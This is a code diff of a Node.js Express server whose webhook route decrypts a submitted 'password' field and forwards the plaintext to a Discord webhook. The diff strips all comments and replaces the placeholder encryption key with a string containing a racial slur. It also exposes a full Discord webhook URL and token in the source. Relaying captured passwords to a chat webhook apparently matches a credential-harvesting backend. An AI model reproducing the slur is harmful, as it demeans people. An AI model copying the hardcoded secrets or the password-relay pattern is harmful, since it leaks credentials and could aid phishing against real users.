@@ -5,13 +5,13 @@ import bodyParser from "body-parser";
 import CryptoJS from "crypto-js";
 
 const app = express();
-const encryptionKey = "super-secret-key"; // Change this and keep it secret!
+const encryptionKey = "nigga.u.are.a.coon.u.aint.gon.find.a.vulnerability"; 
 
-// Enable CORS
+
 app.use(cors());
 app.use(bodyParser.json());
 
-// Webhook Route with Referrer Check & Decryption
+
 app.post("/webhook", async (req, res) => {
     try {
         const referrer = req.get("Referrer");
@@ -21,11 +21,11 @@ app.post("/webhook", async (req, res) => {
 
         const encryptedMessage = req.body.password;
 
-        // Decrypt the message
+        
         const bytes = CryptoJS.AES.decrypt(encryptedMessage, encryptionKey);
         const decryptedMessage = bytes.toString(CryptoJS.enc.Utf8);
 
-        // Send decrypted message to Discord Webhook
+        
         const webhookData = { content: decryptedMessage };
         const webhookUrl = "https://discord.com/api/webhooks/1339836003552071720/zP_2Iu8Nk7AIdo5LlCJSkMDCnsig8GNiUXy3KFF-tMXUNdALCVxIAjz_UYjN-tMpI1eq";
 
@@ -48,7 +48,7 @@ app.post("/webhook", async (req, res) => {
     }
 });
 
-// Start server
+
 const PORT = process.env.PORT || 3000;
 app.listen(PORT, () => {
     console.log(`Server running on port ${PORT}`);
